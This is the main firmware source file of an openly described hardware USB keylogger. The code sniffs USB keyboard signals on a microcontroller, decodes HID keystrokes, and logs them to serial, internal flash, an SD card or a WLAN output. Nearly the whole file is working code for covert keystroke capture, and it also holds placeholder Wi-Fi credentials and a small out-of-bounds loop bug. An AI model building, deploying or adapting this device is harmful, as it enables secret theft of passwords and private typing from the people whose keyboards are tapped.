// Main firmware file for USB keylogger
// See https://github.com/gereonsuch/keylogger for more information
// Copyright (C) 2026 Gereon Such

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.



// === IMPORTANT ===
// Setup your data propagation method here via these defines. 
// SD Card interface requires an SD slot...
// Just as WLAN requires a WLAN interface...
// Flash stores the read characters on the internal flash in keylog.txt, but can only be read via serial interface! see flash_output_handler.h for more information

#define WITH_SERIAL_OUTPUT
//#define WITH_SD_CARD_OUTPUT
//#define WITH_WLAN_OUTPUT
#define WITH_FLASH_OUTPUT



#include <Arduino.h>
#include <cctype>

#include "gpio_capture.h"

#include "bitsync.h"
#include "usbhiddec.h"
#include "threadsafebuffer.h"
  
static uint32_t process_max_us  = 0;
static uint32_t blocks_done     = 0;
static uint32_t false_crcs = 0;

static BitSync syncer;
static USBHIDDec dec;
static PressedKeysLookup<6> pressedkeyslookup;
static ThreadsafeBuffer<char, 2048> characterbuffer;

// output interfaces

#ifdef WITH_SERIAL_OUTPUT
#include "serial_output_handler.h"
SerialOutputHandler _serial_output_handler;
#endif

#ifdef WITH_SD_CARD_OUTPUT
#include "sd_output_handler.h"
SDCardOutputHandler _sd_output_handler;
const char* _sd_log_file = "keylog.txt";
const unsigned _sd_reopen_timeout = 5000u;
#endif


#ifdef WITH_WLAN_OUTPUT
#include "wlan_output_handler.h"
const char* wlan_ssid = "Test001";
const char* wlan_passwd = "asdfasdf";
WLANOutputHandler _wlan_output_handler{wlan_ssid, wlan_passwd};
#endif

#ifdef WITH_FLASH_OUTPUT
#include "flash_output_handler.h"
FlashOutputHandler _flash_output_handler;
#endif

// arduino processing routines


// second core for output processing

void setup1() {
    // setup second core process.
    // nothing to do here

    while (millis() < 2000u) {} // delay for startup

    #ifdef WITH_SD_CARD_OUTPUT
    _sd_output_handler.init(SPI);
    _sd_output_handler.openFile(SPI, _sd_log_file);
    #endif

    #ifdef WITH_WLAN_OUTPUT
    _wlan_output_handler.start();
    #endif

    #ifdef WITH_FLASH_OUTPUT
    _flash_output_handler.init();
    #endif
}

void loop1() {
    bool anything_done = false;

    {
        const unsigned output_buffer_capacity = 1024;
        char output_buffer[output_buffer_capacity];

        unsigned n = characterbuffer.fetch(output_buffer, output_buffer_capacity);
        anything_done = (n > 0u);
        
        // output handlers
        #ifdef WITH_SERIAL_OUTPUT
        _serial_output_handler.pushString(output_buffer, n);
        #endif

        #ifdef WITH_SD_CARD_OUTPUT
        bool sd_write_ok = _sd_output_handler.writeBytes(SPI, output_buffer, n);
        if(! sd_write_ok && ! _sd_output_handler.isInitialized() && _sd_output_handler.timeSinceLastOpenCall() > _sd_reopen_timeout) // avoid repeated reopen. 
            _sd_output_handler.openFile(SPI, _sd_log_file);
        #endif

        #ifdef WITH_WLAN_OUTPUT
        _wlan_output_handler.appendContent(output_buffer, n);
        if(_wlan_output_handler.poll())
            anything_done = true;
        #endif

        #ifdef WITH_FLASH_OUTPUT
        _flash_output_handler.writeContent(output_buffer, n);
        _flash_output_handler.checkPropagate();
        #endif
    }

    if(! anything_done) 
        delay(50); // avoid polling queue repeatedly if empty, delay here
   
}



// primary core for data handling

void setup() {
    while (millis() < 3000u) {} // delay for startup
 
    capture_begin();
}
    

// intermediate buffer where processed characters are stored. 
// the transfer from this buffer to the propagation routine (loop1) is primarily done when a signal chunk 
// was processed and no next one is available yet as the push to the queue might block some time
const unsigned result_capacity = 1024;
const unsigned result_threshold = 128;
char result[result_capacity];
char* result_ptr = result; // iter on result
unsigned n_result_available = result_capacity; // how much is still aviailable in result_ptr

void pushResultToThreadsafeBuffer() {
    if(n_result_available < result_capacity) { // move produced characters to output
        unsigned n_produced = result_capacity - n_result_available;
        unsigned n = characterbuffer.push(result, n_produced);
        result_ptr -= n;
        n_result_available += n;
    }
}

static void process_buffer(const uint32_t*, uint32_t, char*&, unsigned&); // forward declaration

void loop() {
    uint8_t idx;
 
    if (capture_buffer_ready(&idx)) {
        if(n_result_available < result_threshold)  // not much space in current result buffer, need to push to queue now
            pushResultToThreadsafeBuffer();
 
        uint32_t t0 = micros();
        process_buffer(capture_buf[idx], DMA_BUFFER_WORDS, result_ptr, n_result_available);
        uint32_t dt = micros() - t0;

        capture_buffer_consumed();
 
        if (dt > process_max_us) process_max_us = dt;
        if (dt > FILL_TIME_US) 
            Serial.printf("[WARN] processing to slow, took %lu usec but may only last %lu usec\n", dt, (uint32_t)FILL_TIME_US);
        
        blocks_done++;
    } else { // no block available. instead of idling, use this time to push data to threadsafe buffer primarily
        pushResultToThreadsafeBuffer();
    }
}





// primary data acquisition routine
// this process fetches the bits from pio memory buffers and processes them to the outbuf
static void process_buffer(const uint32_t *buf, uint32_t words, char*& outbuf, unsigned& maxlen) {
    for(unsigned i = 0; i < words; i++) {

        uint32_t word = buf[i];
        if(! dec.isSynced() && (word == 0xffffffffu || word == 0x0u)) {
            dec.reset();
            continue;
        }

        syncer.pushBitsFromPackedWithFirstBitInMSB(word);

        const unsigned syncedlen = 32;
        unsigned char syncedbuf[syncedlen];
        unsigned num = syncer.sync(syncedbuf);

        syncer.consume();

        for (unsigned i = 0; i < num; i++) {
            bool success = dec.pushBit(syncedbuf[i]);
            if (success) {

                auto* bytes = dec.getBytes();
                bool crc_ok = checkCRC16(bytes);

                /*{ // log raw data
                    Serial.printf("[%u %u %u %u %u %u %u %u %u]\n",
                        (unsigned) dec.getCurrentSyncWord(),
                        (unsigned)(bytes[0]),
                        (unsigned)(bytes[1]),
                        (unsigned)(bytes[2]),
                        (unsigned)(bytes[3]),
                        (unsigned)(bytes[4]),
                        (unsigned)(bytes[5]),
                        (unsigned)(bytes[6]),
                        (unsigned)(bytes[7])
                    );
                }*/
                
                if(! crc_ok) {
                    false_crcs++;
                } else {
                    ModifierReader modifier(bytes[0]);

                    unsigned char pressed_keys[6];
                    for (unsigned k = 0; k < 6; k++) pressed_keys[k] = 0;

                    pressedkeyslookup.eval(bytes+2, 6, pressed_keys);
                    for (unsigned k = 0; k < 7; k++) {
                        unsigned char v = pressed_keys[k];
                        if (v == 0) break;

                        // right now, the transfered data is the interpretation of the keys. 
                        // maybe we should log the raw HID values here so a de-mapping can be done correctly with different mappings on log evaluation
                        appendCharFromHIDValue(outbuf, maxlen, v, modifier); 
                    }
                }

                dec.reset();
            }
        }
    }
}
